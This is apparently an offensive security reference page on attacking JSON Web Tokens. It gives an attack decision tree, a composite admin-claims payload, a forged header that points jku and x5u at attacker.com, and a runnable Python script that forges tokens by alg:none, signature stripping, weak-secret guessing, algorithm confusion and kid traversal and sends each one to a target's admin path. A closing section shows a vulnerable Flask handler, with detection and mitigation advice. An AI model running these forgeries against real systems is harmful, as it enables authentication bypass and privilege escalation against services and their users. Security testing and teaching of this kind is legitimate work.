# JWT — Advanced Techniques

This file is now a pointer index. Detailed writeups have moved to `scenarios/jwt/`.

## Coverage moved to scenarios

| Topic | Scenario file |
|---|---|
| x5u / x5c X.509 injection | `scenarios/jwt/x5u-x5c-injection.md` |
| kid path traversal | `scenarios/jwt/kid-path-traversal.md` |
| kid SQL injection | `scenarios/jwt/kid-path-traversal.md` (SQLi section) |
| Algorithm confusion (RS256→HS256) | `scenarios/jwt/alg-confusion.md` |
| jwk header injection | `scenarios/jwt/jwk-injection.md` |
| jku URL injection | `scenarios/jwt/jku-injection.md` |
| alg:none variants | `scenarios/jwt/none-algorithm.md` |
| Signature stripping | `scenarios/jwt/signature-stripping.md` |
| Weak HMAC secret crack | `scenarios/jwt/weak-secret-crack.md` |
| Claim tampering / privilege escalation | `scenarios/jwt/claim-tampering.md` |
| Psychic signatures (CVE-2022-21449) | `scenarios/jwt/psychic-signatures-cve-2022-21449.md` |
| JWE nested PlainJWT | `scenarios/jwt/jwe-nested-token.md` |

## Quick attack-chain decision tree

```
1. Decode token (cut -d. -f2 | base64 -d | jq)

2. Try cheap attacks first:
   ├── alg:none + variants → none-algorithm.md
   ├── Signature strip → signature-stripping.md
   └── Common weak secrets (secret, password, your-256-bit-secret) → weak-secret-crack.md

3. Inspect header for trusted parameters:
   ├── jwk → jwk-injection.md
   ├── jku → jku-injection.md (also yields SSRF)
   ├── kid → kid-path-traversal.md
   ├── x5u / x5c → x5u-x5c-injection.md
   └── alg=RS* + JWKS exposure → alg-confusion.md

4. JVM matches CVE-2022-21449? → psychic-signatures-cve-2022-21449.md

5. Token is JWE (5 parts)? → jwe-nested-token.md

6. Forgery primitive working? → claim-tampering.md
```

## Composite escalation payload

When you have a forgery primitive, throw multiple privilege claims at once:

```json
{
  "sub": "admin",
  "user_id": 1,
  "role": "admin",
  "roles": ["admin", "superuser"],
  "is_admin": true,
  "isAdmin": true,
  "admin": true,
  "permissions": ["*"],
  "scope": "admin:all",
  "exp": 9999999999,
  "iat": 0,
  "tenant_id": "victim-tenant",
  "iss": "https://trusted-issuer.com",
  "aud": "internal-services"
}
```

The verifier may check only some claims; throwing many maximises the chance of one driving authorization.

## Composite header pollution

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "../../../dev/null",
  "jwk": {"kty":"RSA","e":"AQAB","n":"<your_modulus>"},
  "jku": "https://attacker.com/jwks.json",
  "x5u": "https://attacker.com/cert.pem"
}
```

Multiple injection vectors at once; whichever the verifier honors first wins.

## Quick Python runner for all attacks

```python
#!/usr/bin/env python3
"""Run all standard JWT attacks against a target endpoint."""
import jwt, base64, json, requests
from jwcrypto import jwk

def smoke_test(token, target_url, target_path='/admin'):
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, options={"verify_signature": False})
    payload['sub'] = 'admin'
    payload['role'] = 'admin'

    tests = []

    # Test 1: alg:none
    h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    tests.append(('alg:none', f"{h}.{p}."))

    # Test 2: signature strip
    parts = token.split('.')
    new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    tests.append(('strip', f"{parts[0]}.{new_p}."))

    # Test 3: Weak secrets
    for secret in ['secret', 'password', 'your-256-bit-secret']:
        try:
            forged = jwt.encode(payload, secret, algorithm='HS256')
            tests.append((f'weak-{secret}', forged))
        except: pass

    # Test 4: Algorithm confusion (if JWKS reachable)
    try:
        jwks = requests.get(f"{target_url}/.well-known/jwks.json").json()
        key = jwk.JWK(**jwks['keys'][0])
        pem = key.export_to_pem()
        forged = jwt.encode(payload, pem, algorithm='HS256',
                            headers={"alg":"HS256","typ":"JWT"})
        tests.append(('alg-confusion', forged))
    except: pass

    # Test 5: kid path traversal
    forged = jwt.encode(payload, base64.b64decode('AA=='),
                         algorithm='HS256',
                         headers={"alg":"HS256","kid":"../../../../../../../dev/null"})
    tests.append(('kid-traverse', forged))

    # Submit each
    for name, t in tests:
        r = requests.get(target_url + target_path,
                         headers={'Authorization': f'Bearer {t}'})
        print(f"{name}: HTTP {r.status_code}")

# Usage:
# smoke_test('eyJ...', 'https://target.com', '/admin')
```

## Signature-binding flaw — claims trusted without DB existence check

A correctly-validated JWT signature only proves the payload wasn't tampered with — it proves NOTHING about whether the subject still exists or is authorised. Many handlers skip the database lookup:

```python
# VULNERABLE — never confirms user_id is real
@app.before_request
def auth():
    token = request.headers.get('Authorization', '').split(' ')[-1]
    decoded = jwt.decode(token, SECRET, algorithms=['HS256'])
    request.user_id = decoded['user_id']         # trusted as-is, no SELECT
    request.role    = decoded.get('role', 'user')
```

Once the signing key is leaked (via separate file-disclosure / git history / config endpoint), the attacker forges:

```python
import jwt
admin_token = jwt.encode({'user_id': 99999, 'role': 'admin'}, SECRET, algorithm='HS256')
```

`user_id=99999` doesn't exist in the DB. Authorisation checks (`if request.role == 'admin'`) pass. Downstream queries (`SELECT * FROM signatures WHERE user_id = 99999`) return empty — the handler may error, return 404, or accept the empty result depending on coding. Pair with a stacked-SQLi write primitive (see [../../injection/reference/scenarios/sql/stacked-queries.md](../../injection/reference/scenarios/sql/stacked-queries.md)) to INSERT the missing row and complete the bypass.

Detection — grep the codebase for `jwt.decode(...)` and check that EVERY use is followed by a `User.query.filter_by(id=...).first()` (or equivalent ORM lookup) before claims are trusted. Frameworks like Flask-JWT-Extended require explicit `@user_lookup_loader` decorators; their absence is the bug.

Mitigation — wrap JWT auth in middleware that loads the user record from the DB and aborts on `None`. Treat the JWT as a *cache* of the user ID, not as the source of authorisation truth.

## Resources

- `scenarios/jwt/` — full per-technique writeups.
- `jwt-quickstart.md` — fast reference.
- `jwt_security_resources.md` — tools, CVEs, libraries.
